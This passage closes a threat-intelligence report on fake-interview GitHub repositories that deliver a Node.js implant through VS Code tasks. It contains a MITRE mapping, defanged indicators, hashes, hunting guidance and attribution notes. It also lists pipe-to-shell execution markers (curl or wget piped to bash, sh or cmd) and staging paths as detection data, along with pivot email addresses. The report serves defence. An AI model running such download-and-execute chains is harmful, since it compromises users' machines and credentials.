0xroamanteam <simonsharp331+1@gmail.com>
0xroaman-4 <serhiiprymierov25+2@gmail.com>
```

The identities are useful for searching repository histories and locating sibling projects. They are not verified operator identities.

Several observations are analytically useful without treating them as attribution proof:

- `GitWorkHub9` appears with multiple email addresses and time zones.
- The same May 20 patch sequence appears in both branches with identical author metadata and timestamps.
- The May 28 migration is represented by `GitWorkHub9` in AjunaVerse and `AlchemyWorkHub` in AlchemyMVP.
- `divanefapibi31@gmail[.]com` appears in both branch contexts.
- The final Vercel rotation was committed one minute apart under different displayed personas.

Git author and committer fields can be arbitrarily set, commits can be backdated, accounts can be shared, and repository histories can be copied or grafted. Provider-side account records would be required for person-level attribution.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Evidence |
|---|---|---|---|
| T1204.002 | User Execution: Malicious File | Execution | Target opens or installs an untrusted repository |
| T1059.003 | Windows Command Shell | Execution | Windows task pipes Stage 1 to `cmd`; bootstrap executes through hidden `cmd.exe` |
| T1059.004 | Unix Shell | Execution | Linux/macOS tasks pipe scripts to `sh`/`bash` |
| T1059.007 | JavaScript/JScript | Execution | Repository beacon and `env.npl` execute under Node.js; C2 messages run through `eval()` |
| T1027 | Obfuscated Files or Information | Defense Evasion | Registrar payload uses encoded string tables and concealed Base64 C2 data |
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | Payload decodes strings and C2 URL at runtime |
| T1036 | Masquerading | Defense Evasion | Malware is hidden in branded Web3/metaverse repositories and files named as environment/VS Code setup |
| T1105 | Ingress Tool Transfer | Command and Control | Vercel stages shell, command, bootstrap, package, and Node.js payload files |
| T1071.001 | Web Protocols | Command and Control | HTTPS staging and HTTP JSON tasking |
| T1082 | System Information Discovery | Discovery | Hostname, OS type, release, and platform collected |
| T1016 | System Network Configuration Discovery | Discovery | Network interfaces enumerated for a non-loopback MAC address |
| T1119 | Automated Collection | Collection | Host profile and complete `process.env` gathered repeatedly |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | Environment variables can contain credentials loaded from files, shell profiles, or parent processes |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Host and environment data sent with registrar beacons |

No durable operating-system persistence mechanism such as a scheduled task, service, registry Run key, systemd unit, cron job, or LaunchAgent was identified. Re-execution is tied to the repository, VS Code automatic tasks, npm lifecycle behavior, and files written under the user `.vscode` directory.

---

## Indicators of Compromise

> Indicators are defanged. Git names and emails are pivots, not verified actor identities.

### Current Repository Indicators

```text
LimitBreak-Solutions/AjunaVerse
AlchemyGlobal/AlchemyMVP
```

### Git Lineage Indicators

```text
AjunaVerse HEAD:
4ca98b1d45548a4ed106ca3218b0acf1295fcc69

AlchemyMVP HEAD:
f00cc7e05b3905c13be10575952761813196c330

Common merge base:
386c5a17c8729eb4753d6c8ca063717abfb4d8b5

Shared Gamifly-lineage commits:
89da1a9d1e0856957afa2217af2241257ac3670f
ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6
```

### Network Indicators

```text
vscode-settings-529[.]vercel[.]app
vscode-settings-422-self[.]vercel[.]app
138.201.128[.]169
138.201.128[.]169:1224
hxxp://138.201.128[.]169:1224/api/checkStatus
```

### Staging Paths

```text
/api/settings/linux
/api/settings/mac
/api/settings/windows
/api/settings/bootstraplinux
/api/settings/bootstrap
/api/settings/env
/api/settings/package
```

### Runtime and Campaign Markers

```text
env.npl
env-setup.js
vscode-bootstrap.sh
vscode-bootstrap.cmd
sysInfo
processInfo
tid
sysId
/api/checkStatus
0x1388
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
now it time to get everything
00:00:00:00:00:00
```

### Repository Execution Markers

```text
runOn: folderOpen
npm install --silent --no-progress
start /b node server || nohup node server &
curl --ssl-no-revoke -L ... | cmd
wget -qO- ... | sh
curl -L ... | bash
module.exports = router; const _0x
```

### Pivot Identities

```text
GitWorkHub9
erick092303@gmail[.]com
fatihafariya8+2@gmail[.]com
AlchemyWorkHub
divanefapibi31@gmail[.]com
divanefapibi31-alt
robertferrero0904-ui
robertferrero0904@gmail[.]com
roamanbuild
luistech.0924@gmail[.]com
0xroamanteam
simonsharp331+1@gmail[.]com
0xroaman-4
serhiiprymierov25+2@gmail[.]com
```

---

## File and Evidence Hashes

| SHA-256 | Artifact |
|---|---|
| `9034946292c3416b7a1ecdf8afbafe44fe84b7db1bf8f769fe98daa49d1ee7b7` | AjunaVerse Git mirror archive |
| `5e5fe6115210c1f6dd36fae03c6954df40654b034b734fd7489e725f1421422a` | AlchemyMVP Git mirror archive |
| `7d75a94a560699c1201574986aa2b6fd5f1e8f397815d36a05ff35d6a4bae8b8` | Shared `.vscode/tasks.json` |
| `1875cdcd577c10d1c7f193a5cba7a4483007274e36dbae493c9babb6a3d44e28` | Shared `.vscode/settings.json` |
| `c913a6b89e6f2d51cb9d6b45f75970cf571784453e85b3051b0409dabc1eb2f0` | Shared root `package.json` |
| `e2d4d02531eb4f325729baaa9adcd4d2785a812657be6875266339d1841aaa8c` | Shared `server.js` |
| `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf` | Shared `routes/index.js` |
| `83c0219e78fe9d6d96944d75ece05205c4c45a8ca6cad485750fd816c44f8ae8` | Shared `routes/api/auth.js` containing embedded beacon |
| `c3b743d14e66bf565248cc09230e3eb50c8864ae049a150f654ddce23eae5308` | Shared `controllers/auth.js` |
| `51d0053cf628ba588bf0a20608ae1ffeb12fd3d12e71b4eb080f4caf152ee056` | Linux Stage-1 wrapper |
| `f73e12a03f5ef78c6104519cba6eff93e17e4888f6ef4062ed4ebb39c3c3927f` | macOS Stage-1 wrapper |
| `983015232a1a783c7dcfd1c3408d0d561576b2c675c5d7c9ce41746b03669db0` | Windows Stage-1 wrapper |
| `c1e0eef9312e9387256caf9dfd2ef5cc6bd2b34451c7269684e2b77924e23403` | Unix Stage-2 bootstrap |
| `f0b2e6028d916da3373893cc52c3c9adb178216606f4bd61025dcd66816400d5` | Windows Stage-2 bootstrap |
| `5788b308dc1ea834d22fc9bd15e065be278e39c74f80caa541ccf5884e4fd6e9` | Captured 451 body from stale `/settings/env` |
| `cacbc80f2783f248858cf0a41f213a886072639bef9dd4147496b7662367bdad` | Captured 451 body from stale `/settings/package` |
| `b7a038af5b373a31342bda13b199a539dedc56c41039d2a695728239700ae005` | Active `env.npl` registrar/tasking implant |
| `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` | Active Stage-3 package manifest |

---

## Hunting and Detection

### Repository Hunting

High-confidence combinations include:

```text
.vscode/tasks.json
runOn = folderOpen
vscode-settings-*.vercel.app/api/settings/
prepare = start /b node server || nohup node server &
env.npl
routes/api/auth.js containing obfuscated code after module.exports
pokersolver
```

Search Git histories for exact commits:

```text
89da1a9d1e0856957afa2217af2241257ac3670f
ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6
386c5a17c8729eb4753d6c8ca063717abfb4d8b5
```

Search for post-divergence commits and patch-equivalent copies:

```text
0ef116dba906a96f4d5a53cf78f77ed5944799b6
4ce6fcc891eb09d562a4627cb3a1c87576f614de
03e91eaf09cfce2ec6a4b2da6a137598b1590073
7111f22de98466503056866f36f578137ecaddfc
4ca98b1d45548a4ed106ca3218b0acf1295fcc69
f00cc7e05b3905c13be10575952761813196c330
```

### Network Hunting

Alert on:

```text
Developer workstations contacting vscode-settings-*.vercel.app
Requests to /api/settings/linux, /mac, /windows, /bootstraplinux, /bootstrap, /env or /package
Node.js processes contacting IP-literal TCP/1224
GET /api/checkStatus containing sysInfo, processInfo, tid and sysId
Five-second periodic requests from VS Code or Node.js process trees
```

Because `processInfo` is placed in the URL query, proxy, firewall, and server logs may contain secrets. Handle those logs as sensitive evidence.

### Host Hunting

Search for:

```text
%USERPROFILE%\.vscode\vscode-bootstrap.cmd
%USERPROFILE%\.vscode\env.npl
%USERPROFILE%\.vscode\package.json
%USERPROFILE%\.vscode\nodejs\
$HOME/.vscode/vscode-bootstrap.sh
$HOME/.vscode/env-setup.js
$HOME/.vscode/package.json
$HOME/.vscode/node-v*-linux-x64/
$HOME/.vscode/node-v*-darwin-x64/
$HOME/.vscode/<workspace-name>.txt
```

Review process trees for:

```text
Code.exe -> cmd.exe -> curl.exe -> cmd.exe
Code -> sh/bash -> wget/curl -> shell
npm -> prepare -> node server
server.js -> network connection to TCP/1224
node.exe env.npl
node env-setup.js
```

### Preventive Controls

- Inspect `.vscode/tasks.json`, `.vscode/settings.json`, npm scripts, Git hooks, and framework configuration before opening untrusted repositories in a trusted IDE.
- Keep automatic task execution disabled for untrusted workspaces.
- Use disposable VMs for interview repositories and unsolicited code-review projects.
- Use `npm install --ignore-scripts` during initial review where operationally appropriate.
- Prevent interview projects from inheriting production credentials or personal wallet/API secrets.
- Monitor developer endpoints for unexpected Node.js downloads and Node processes contacting nonstandard ports.
- Block or alert on Vercel-hosted scripts piped directly into `cmd`, `sh`, or `bash`.

---

## Attribution Assessment

### Repository-Production Cluster

Assessed confidence: **high** that AjunaVerse and AlchemyMVP were produced and maintained through the same operational repository workflow.

The assessment is based on:

1. 336 shared commit objects;
2. 1,730 shared reachable Git objects;
3. a common merge base;
4. current trees differing only in README branding;
5. identical operational Git blobs;
6. at least 19 patch-equivalent branch-specific commits;
7. exact-second and tightly timed replication of malicious changes;
8. shared current staging and registrar infrastructure;
9. the same embedded and downloaded implant.

### Relationship to Gamifly/BetPoker/Dravion Tooling

Assessed confidence: **high**.

The repositories retain exact Git history from the Gamifly poker lineage and preserve the same registrar/tasking protocol family. The new branches refactor delivery rather than replace the underlying operational concept.

### StoatWaffle/WaterPlum Team 8 Context

Assessed confidence: **medium-to-high** for relationship to the publicly documented StoatWaffle-style loader/tooling ecosystem.

The combined overlap—VS Code `folderOpen`, Vercel staging, Node.js bootstrap, `env.npl`, five-second polling, error-state JavaScript execution, blockchain decoys, and Contagious Interview repository tradecraft—is highly specific. Differences in C2 path, port, request schema, and environment collection prevent a byte-level or exact public-sample match.

### Person-Level and State Attribution

Assessed confidence: **low** for any specific person represented in Git metadata.

Assessed confidence: **medium** for consistency with DPRK-linked Contagious Interview activity, strengthened by the StoatWaffle architecture and repository-targeting model. This report does not independently prove state direction or identify the real operators behind the GitHub accounts.

---

## Collection and Analysis Boundaries

The analysis was static. No malicious repository task, npm lifecycle, bootstrap, downloaded runtime, or Node.js payload was executed. Captured network content was preserved without evaluation.

The investigation did not obtain a post-enrollment C2 task from `138.201.128[.]169`. It therefore does not claim which credential-stealer, RAT, or secondary module would have been delivered to a selected victim. Arbitrary JavaScript tasking is nevertheless directly supported by the recovered code.

The current public GitHub state may change after collection. Commit hashes, object identifiers, archive hashes, and captured endpoint bodies preserve the analyzed state as of June 9, 2026.

## References

- ThreatProphet, **Interexy-Branded Gamifly Repositories: Evolution of the BetPoker Loader into a Vercel-Gated Node.js Tasking Implant**, June 9, 2026: `https://threatprophet.com/posts/2026-06-09-gamifly-interexy/`
- ThreatProphet, **BetPoker Interview Lure: Dual Execution Paths, Credential Exfiltration, and a Dormant Node.js Backdoor**, March 2, 2026: `https://threatprophet.com/posts/2026-03-02-betpoker/`
- ThreatProphet, **Dravion-Core Fake Interview Repository**, April 13, 2026: `https://threatprophet.com/posts/2026-04-13-dravion-core/`
- NTT Security Japan, **StoatWaffle, malware used by WaterPlum**, March 17, 2026: `https://jp.security.ntt/insights_resources/tech_blog/stoatwaffle_malware_en/`
- Ransom-ISAC, **Contagious Interview: VS Code to RAT**, March 16, 2026: `https://ransom-isac.org/blog/contagious-interview-vscode-to-rat/`
- GitHub repository observed during collection: `https://github.com/LimitBreak-Solutions/AjunaVerse`
- GitHub repository observed during collection: `https://github.com/AlchemyGlobal/AlchemyMVP`

*TLP:CLEAR — This report may be freely shared. Attribution assessments are tentative and based on exact Git lineage, patch-equivalent maintenance, payload and protocol continuity, staging architecture, and external campaign overlap. All indicators are provided for defensive purposes. Repository and organization names describe observed lure infrastructure and do not establish involvement by any legitimate company or real individual.*

*Report ID: TP-2026-017 | Published: 2026-06-09 | Author: ThreatProphet*
